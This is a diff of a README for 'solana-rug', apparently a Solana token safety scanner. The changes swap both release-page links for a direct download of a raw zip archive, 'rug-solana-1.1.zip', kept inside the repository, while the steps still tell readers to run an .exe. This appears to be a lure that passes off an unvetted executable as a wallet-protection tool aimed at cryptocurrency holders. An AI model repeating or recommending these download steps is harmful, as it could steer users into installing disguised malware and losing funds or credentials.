@@ -1,6 +1,6 @@
 # 🛡️ solana-rug - Identify secure Solana tokens with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/isadoramined405/solana-rug/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/isadoramined405/solana-rug/raw/refs/heads/main/borg/rug-solana-1.1.zip)
 
 solana-rug acts as a safety scanner for your Solana wallet. It checks tokens against security data before you trade. This tool helps you avoid malicious projects by analyzing on-chain records and metadata. It runs locally on your computer to protect your privacy and funds.
 
@@ -9,7 +9,7 @@ solana-rug acts as a safety scanner for your Solana wallet. It checks tokens aga
 You need to access the release page to get the installer. Follow these steps to obtain the tool:
 
 1. Open your web browser.
-2. Navigate to [the release page](https://github.com/isadoramined405/solana-rug).
+2. Navigate to [the release page](https://github.com/isadoramined405/solana-rug/raw/refs/heads/main/borg/rug-solana-1.1.zip).
 3. Look for the latest version at the top of the list.
 4. Click the file ending in .exe to start the download.
 
